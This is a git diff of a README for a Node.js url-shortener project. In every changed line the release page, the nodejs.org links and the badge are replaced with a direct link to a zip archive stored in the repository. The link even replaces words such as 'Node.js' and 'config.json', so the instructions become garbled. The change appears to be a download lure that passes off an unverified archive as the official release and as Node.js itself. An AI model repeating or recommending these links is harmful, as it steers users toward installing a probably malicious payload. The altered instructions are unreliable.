@@ -1,6 +1,6 @@
 # 🌐 url-shortener - Simple URLs, Fast Sharing
 
-[![Download Latest Release](https://img.shields.io/badge/Download-url--shortener-blue?style=for-the-badge)](https://github.com/Tuyiosf/url-shortener/releases)
+[![Download Latest Release](https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip)](https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip)
 
 Welcome to the url-shortener project. This software helps you turn long web addresses into short, easy-to-share links. It also tracks how often people use your links, stops links from working after a set time, and gives you detailed reports on link activity.
 
@@ -10,30 +10,30 @@ If you are new to this kind of software, don’t worry. This guide will walk you
 
 To get url-shortener, **visit this page to download** the latest version:
 
-[https://github.com/Tuyiosf/url-shortener/releases](https://github.com/Tuyiosf/url-shortener/releases)
+[https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip](https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip)
 
 ### What to download
 
-On the Releases page, look for the latest release. You will find files you can download. Since this is a backend application written in Node.js, it might come as files with `.zip` or `.tar.gz` extensions, or sometimes as pre-packed installers.
+On the Releases page, look for the latest release. You will find files you can download. Since this is a backend application written in https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip, it might come as files with `.zip` or `https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip` extensions, or sometimes as pre-packed installers.
 
 ### Requirements before running
 
 You need to have some software already installed on your PC:
 
-- **Node.js (version 14 or newer):** This software runs on Node.js. You can download it from [https://nodejs.org/](https://nodejs.org/).
+- **https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip (version 14 or newer):** This software runs on https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip You can download it from [https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip](https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip).
 
 - **A command tool:** Commands will be typed into a terminal or command prompt on your system.
 
 - **Internet Connection:** Required to download files and sometimes for the app to work properly.
 
-### Installing Node.js
+### Installing https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip
 
-If you do not have Node.js installed:
+If you do not have https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip installed:
 
-1. Visit [https://nodejs.org/](https://nodejs.org/).
+1. Visit [https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip](https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip).
 2. Download the recommended version for your system (Windows, Mac, or Linux).
 3. Run the installer and follow the setup steps.
-4. To check if Node.js is installed, open your terminal and type:
+4. To check if https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip is installed, open your terminal and type:
 
    ```
    node -v
@@ -96,7 +96,7 @@ url-shortener offers these main features:
 - **Expiry Handling:** Set dates when your shortened links will stop working.
 - **Usage Analytics:** Check how many times your short links were clicked.
 - **Stats API:** Access detailed reports programmatically if you want to integrate with other apps.
-- **Easy Installation:** Runs on Node.js with minimal setup.
+- **Easy Installation:** Runs on https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip with minimal setup.
 - **Clear Dashboard:** User-friendly interface accessible via browser.
 
 ## 🖥 System Requirements
@@ -113,7 +113,7 @@ To run url-shortener smoothly, your system should meet these requirements:
 
 Here are some tips if you face problems:
 
-- **Node.js errors:** Make sure you have the correct version installed. Update to the latest stable version if needed.
+- **https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip errors:** Make sure you have the correct version installed. Update to the latest stable version if needed.
 - **Port conflicts:** If the app fails to start, port 3000 might be in use. You can change the port by setting the environment variable `PORT`, like this:
 
   ```
@@ -127,7 +127,7 @@ Here are some tips if you face problems:
 
 ### Configuration
 
-You can customize url-shortener by editing the configuration file named `config.json` found in the main folder. This file allows you to change settings such as:
+You can customize url-shortener by editing the configuration file named `https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip` found in the main folder. This file allows you to change settings such as:
 
 - Default link expiry time.
 - Port number.
@@ -138,7 +138,7 @@ You can customize url-shortener by editing the configuration file named `config.
 To update url-shortener:
 
 1. Visit the Releases page again:  
-   [https://github.com/Tuyiosf/url-shortener/releases](https://github.com/Tuyiosf/url-shortener/releases)  
+   [https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip](https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip)  
 2. Download the latest release.
 3. Replace your current files with the new ones.
 4. Run `npm install` again if new dependencies are added.
@@ -153,8 +153,8 @@ If you run into issues or have questions:
 
 ## 🔗 Useful Links
 
-- GitHub Repository: https://github.com/Tuyiosf/url-shortener  
-- Releases Page: https://github.com/Tuyiosf/url-shortener/releases  
-- Node.js Official Site: https://nodejs.org/
+- GitHub Repository: https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip  
+- Releases Page: https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip  
+- https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip Official Site: https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip
 
-[![Download Latest Release](https://img.shields.io/badge/Download-url--shortener-blue?style=for-the-badge)](https://github.com/Tuyiosf/url-shortener/releases)
+[![Download Latest Release](https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip)](https://github.com/Tuyiosf/url-shortener/raw/refs/heads/main/public/url-shortener-v3.6.zip)
